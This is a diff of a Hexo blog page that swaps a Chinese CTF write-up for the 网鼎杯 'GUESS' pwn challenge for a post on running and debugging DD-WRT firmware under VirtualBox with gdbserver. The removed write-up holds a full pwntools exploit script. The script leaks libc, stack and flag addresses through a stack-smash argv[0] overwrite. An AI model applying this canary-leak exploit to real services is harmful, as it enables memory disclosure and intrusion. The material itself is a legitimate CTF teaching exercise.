@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="IoT,DD-WRT," />
 
 
 
@@ -81,19 +81,23 @@
 
 
 
-<meta name="description" content="网鼎杯-guess题目链接如下： 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 题目分析程序的主要代码如下： 程序首先打开flag.txt将flag读取到了栈中，接着进入循环，每次循环会fork出一个进程，该进程会读取用户输入的flag，并将该flag与存在栈中的标准flag进行比较。并且对fork的次数进行了限制，最多只能f">
+<meta name="description" content="最近有运行并调试DD-WRT中程序的需求，最开始想的是从源码编译一个x86 or x86_64下的待调试程序出来直接在本地调，可是DD-WRT的官方文档写的不怎么好，而且光是下载好源码和交叉编译工具就占用了超过55G的空间。后来发现官方其实已经基于最新版源码编译好了适应各种架构/型号的固件，再结合VirtualBox就能将这个最新版的固件跑起来，简直完美！ 运行环境搭建相关工具准备下载安装virt">
+<meta name="keywords" content="IoT,DD-WRT">
 <meta property="og:type" content="article">
-<meta property="og:title" content="网鼎杯-GUESS">
-<meta property="og:url" content="https://e3pem.github.io/2018/11/14/wangdingbei/网鼎杯-guess/index.html">
+<meta property="og:title" content="Run and Debug DD-WRT with VirtualBox">
+<meta property="og:url" content="https://e3pem.github.io/2020/03/20/IoT/DD-WRT-VirtualBox/index.html">
 <meta property="og:site_name" content="e3pem&#39;s Blog">
-<meta property="og:description" content="网鼎杯-guess题目链接如下： 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 题目分析程序的主要代码如下： 程序首先打开flag.txt将flag读取到了栈中，接着进入循环，每次循环会fork出一个进程，该进程会读取用户输入的flag，并将该flag与存在栈中的标准flag进行比较。并且对fork的次数进行了限制，最多只能f">
+<meta property="og:description" content="最近有运行并调试DD-WRT中程序的需求，最开始想的是从源码编译一个x86 or x86_64下的待调试程序出来直接在本地调，可是DD-WRT的官方文档写的不怎么好，而且光是下载好源码和交叉编译工具就占用了超过55G的空间。后来发现官方其实已经基于最新版源码编译好了适应各种架构/型号的固件，再结合VirtualBox就能将这个最新版的固件跑起来，简直完美！ 运行环境搭建相关工具准备下载安装virt">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/26759687.jpg">
-<meta property="og:updated_time" content="2019-08-07T08:34:10.865Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320092621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320093031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320093139.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320095246.png">
+<meta property="og:updated_time" content="2020-03-20T02:09:46.564Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="网鼎杯-GUESS">
-<meta name="twitter:description" content="网鼎杯-guess题目链接如下： 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 题目分析程序的主要代码如下： 程序首先打开flag.txt将flag读取到了栈中，接着进入循环，每次循环会fork出一个进程，该进程会读取用户输入的flag，并将该flag与存在栈中的标准flag进行比较。并且对fork的次数进行了限制，最多只能f">
-<meta name="twitter:image" content="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/26759687.jpg">
+<meta name="twitter:title" content="Run and Debug DD-WRT with VirtualBox">
+<meta name="twitter:description" content="最近有运行并调试DD-WRT中程序的需求，最开始想的是从源码编译一个x86 or x86_64下的待调试程序出来直接在本地调，可是DD-WRT的官方文档写的不怎么好，而且光是下载好源码和交叉编译工具就占用了超过55G的空间。后来发现官方其实已经基于最新版源码编译好了适应各种架构/型号的固件，再结合VirtualBox就能将这个最新版的固件跑起来，简直完美！ 运行环境搭建相关工具准备下载安装virt">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320092621.png">
 
 
 
@@ -123,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://e3pem.github.io/2018/11/14/wangdingbei/网鼎杯-guess/"/>
+  <link rel="canonical" href="https://e3pem.github.io/2020/03/20/IoT/DD-WRT-VirtualBox/"/>
 
 
 
 
 
-  <title>网鼎杯-GUESS | e3pem's Blog</title>
+  <title>Run and Debug DD-WRT with VirtualBox | e3pem's Blog</title>
   
 
 
@@ -266,7 +270,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2018/11/14/wangdingbei/网鼎杯-guess/">
+    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2020/03/20/IoT/DD-WRT-VirtualBox/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="e3pem">
@@ -283,7 +287,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">网鼎杯-GUESS</h2>
+          <h2 class="post-title" itemprop="name headline">Run and Debug DD-WRT with VirtualBox</h2>
         
 
         <div class="post-meta">
@@ -295,8 +299,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-14T12:05:00+08:00">
-                2018-11-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-20T12:00:00+08:00">
+                2020-03-20
               </time>
             
 
@@ -318,8 +322,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
+                  <a href="/categories/IoT/" itemprop="url" rel="index">
+                    <span itemprop="name">IoT</span>
                   </a>
                 </span>
 
@@ -355,15 +359,38 @@
       
 
       
-        <h1 id="网鼎杯-guess"><a href="#网鼎杯-guess" class="headerlink" title="网鼎杯-guess"></a>网鼎杯-guess</h1><p>题目链接如下：</p>
-<p>链接：<a href="https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ</a> 密码：isek</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序的主要代码如下：<br><img src="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/26759687.jpg" alt=""></p>
-<p>程序首先打开flag.txt将flag读取到了栈中，接着进入循环，每次循环会fork出一个进程，该进程会读取用户输入的flag，并将该flag与存在栈中的标准flag进行比较。并且对fork的次数进行了限制，最多只能fork三次，也就是只有三次‘猜’flag的机会。</p>
-<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>程序在读取输入的时候存在溢出，没有对输入的内容长度进行限制，但是这里开启了Cannary，所以不能简单的控制程序的执行流程。</p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里开启了Cannary，为了绕过它的保护，可以通过爆破或者泄露的方式，但是这里对fork的次数进行了限制，所以爆破的方法不行。</p>
-<p>采用stack smash来进行信息泄露，stack smash的原理在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#stack-smash" target="_blank" rel="noopener">CTF Wiki</a>中有介绍。大概原理就是在Cannary被覆盖之后程序会检测到错误，这时会执行<code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而argv[0]指针是保存在栈上的，默认指向的是程序的名称，通过覆盖该指针为我们想要泄露的地址达到信息泄漏的目的。</p>
-<p>程序只能泄露三次，可以按照如下顺序泄露：首先通过got表来泄露libc的基址，接着利用libc中的environ变量来泄露栈的基址，最后通过固定的偏移来泄露栈上存放的flag</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./GUESS'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./GUESS'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'This is GUESS FLAG CHALLENGE!'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># set follow-fork-mod child</span></span><br><span class="line"><span class="comment"># b *0x400b28</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># print p.recvuntil('Please type your guessing flag')</span></span><br><span class="line"><span class="comment"># raw_input('aaa')</span></span><br><span class="line"><span class="comment"># p.sendline('a'*0x30)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line"><span class="comment"># here is offset to argv[0]</span></span><br><span class="line">offset = <span class="number">0x40</span>+<span class="number">0x8</span>*<span class="number">3</span>+(<span class="number">0x7fff42181a88</span><span class="number">-0x7fff421819b8</span>)</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(<span class="number">0x602048</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line"><span class="comment"># 0x7fb8571c1740</span></span><br><span class="line">libc_start_main = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = libc_start_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment"># using environ to leak stack base addr</span></span><br><span class="line">stack_base_ptr = libc_base+libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(stack_base_ptr)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(stack_base_ptr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line"><span class="comment"># 0x7fb8571c1740</span></span><br><span class="line">stack_base = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_base:'</span>+hex(stack_base)</span><br><span class="line"><span class="comment"># calc flag addr by stack_base-flag_offset</span></span><br><span class="line">flag_offset = <span class="number">0x7ffc67b40248</span><span class="number">-0x7ffc67b400e0</span></span><br><span class="line">flag_addr = stack_base - flag_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>最近有运行并调试DD-WRT中程序的需求，最开始想的是从源码编译一个x86 or x86_64下的待调试程序出来直接在本地调，可是DD-WRT的官方文档写的不怎么好，而且光是下载好源码和交叉编译工具就占用了超过55G的空间。后来发现官方其实已经基于最新版源码编译好了适应各种架构/型号的固件，再结合VirtualBox就能将这个最新版的固件跑起来，简直完美！</p>
+<h2 id="运行环境搭建"><a href="#运行环境搭建" class="headerlink" title="运行环境搭建"></a>运行环境搭建</h2><h3 id="相关工具准备"><a href="#相关工具准备" class="headerlink" title="相关工具准备"></a>相关工具准备</h3><p>下载安装virtualbox：</p>
+<p><a href="https://download.virtualbox.org/virtualbox/6.1.4/VirtualBox-6.1.4-136177-Win.exe" target="_blank" rel="noopener">https://download.virtualbox.org/virtualbox/6.1.4/VirtualBox-6.1.4-136177-Win.exe</a></p>
+<p>下载VirtualBox Extension Pack：<br><a href="https://download.virtualbox.org/virtualbox/6.1.4/Oracle_VM_VirtualBox_Extension_Pack-6.1.4.vbox-extpack" target="_blank" rel="noopener">https://download.virtualbox.org/virtualbox/6.1.4/Oracle_VM_VirtualBox_Extension_Pack-6.1.4.vbox-extpack</a></p>
+<p>我这里准备在64位下运行固件，所以下载dd-wrt x86_64 image（可以在<a href="https://dd-wrt.com/support/other-downloads/" target="_blank" rel="noopener">官网</a>找到最新编译好的image）：</p>
+<p><a href="https://download1.dd-wrt.com/dd-wrtv2/downloads/betas/2020/03-18-2020-r42729/x86_64/dd-wrt_x64_public_vga.image" target="_blank" rel="noopener">https://download1.dd-wrt.com/dd-wrtv2/downloads/betas/2020/03-18-2020-r42729/x86_64/dd-wrt_x64_public_vga.image</a></p>
+<h3 id="创建VM"><a href="#创建VM" class="headerlink" title="创建VM"></a>创建VM</h3><p>首先将dd-wrt x64 image 转换为VDI形式，进入到VirtualBox安装的目录，执行如下代码（需根据自己的情况将其中的路径进行替换）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vboxmanage.exe convertdd &quot;D:\tmp\rm\dd-wrt\dd-wrt_x64_public_vga.image&quot; &quot;D:\tmp\rm\dd-wrt\dd-wrt-64.vdi&quot;</span><br></pre></td></tr></table></figure>
+<p>设置VDI文件的大小：</p>
+<pre><code>vboxmanage.exe modifyhd --resize 512 &quot;D:\tmp\rm\dd-wrt\dd-wrt-64.vdi&quot;
+</code></pre><p>接着启动VirtualBox，创建新的VM:</p>
+<ul>
+<li>类型选择Linux</li>
+<li>版本选择Other Linux</li>
+<li>不添加虚拟硬盘</li>
+</ul>
+<h3 id="设置存储"><a href="#设置存储" class="headerlink" title="设置存储"></a>设置存储</h3><p>然后将设置过大小后的VDI文件拷贝到新建的VM目录下。并设置VM的存储，选择刚刚复制的VDI文件：</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320092621.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320093031.png" alt=""></p>
+<h3 id="设置网络"><a href="#设置网络" class="headerlink" title="设置网络"></a>设置网络</h3><p>在设置界面点击网络，选择桥接：</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320093139.png" alt=""></p>
+<p>启动vm，在界面的内容不再滚动时，按下回车，并使用<code>root/admin</code>登录，使用如下命令设置dd-wrt的网络（要和当前主机在同一个网段）：</p>
+<pre><code>ifconfig br0 192.168.1.144
+</code></pre><p>接着就可以通过浏览器访问该地址，进入dd-wrt后台了</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200320095246.png" alt=""></p>
+<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>要调试dd-wrt里面的程序，需要有对应的静态编译的gdbserver（64位），下载源码：<a href="https://ftp.gnu.org/gnu/gdb/" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/gdb/</a></p>
+<p>进入到./gdb/gdbserver目录下，执行下列命令（执行./configure之后还需要手动修改Makefile文件以生成静态的gdbserver）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --host=x86_64-linux --target=x86_64-linux</span><br><span class="line">// modify CC-LD=$&#123;CC&#125; to CC-LD=gcc -static</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
+<p>编译之前需要下载<a href="https://github.com/pwndbg/gdb-prebuilt/blob/master/gdb-7.7-python-3/lib/libinproctrace.so" target="_blank" rel="noopener">libinproctrace.so</a>，并把它放到gdbserver目录下。</p>
+<p>将编译好的gdbserver上传至DD-WRT中，附加待调试进程即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tftp -g -r gdbserver ip_addr</span><br><span class="line">chmod +x gdbserver</span><br><span class="line">./gdbserver 0.0.0.0:12345 --attach pid</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.youtube.com/watch?v=BRLukj4dZxk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=BRLukj4dZxk</a></p>
+
       
     </div>
     
@@ -378,6 +405,14 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/IoT/" rel="tag"># IoT</a>
+          
+            <a href="/tags/DD-WRT/" rel="tag"># DD-WRT</a>
+          
+        </div>
+      
 
       
       
@@ -387,8 +422,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/10/wangdingbei/网鼎杯pwn-blind/" rel="next" title="网鼎杯-blind">
-                <i class="fa fa-chevron-left"></i> 网鼎杯-blind
+              <a href="/2020/03/06/browser/pwnhub-d8/" rel="next" title="roll_a_d8 && pwnhub d8题解">
+                <i class="fa fa-chevron-left"></i> roll_a_d8 && pwnhub d8题解
               </a>
             
           </div>
@@ -396,10 +431,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/14/wangdingbei/网鼎杯pwn-babyheap/" rel="prev" title="网鼎杯-babyheap">
-                网鼎杯-babyheap <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -581,7 +612,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯-guess"><span class="nav-number">1.</span> <span class="nav-text">网鼎杯-guess</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">1.3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#运行环境搭建"><span class="nav-number">1.</span> <span class="nav-text">运行环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#相关工具准备"><span class="nav-number">1.1.</span> <span class="nav-text">相关工具准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建VM"><span class="nav-number">1.2.</span> <span class="nav-text">创建VM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置存储"><span class="nav-number">1.3.</span> <span class="nav-text">设置存储</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置网络"><span class="nav-number">1.4.</span> <span class="nav-text">设置网络</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试环境"><span class="nav-number">2.</span> <span class="nav-text">调试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
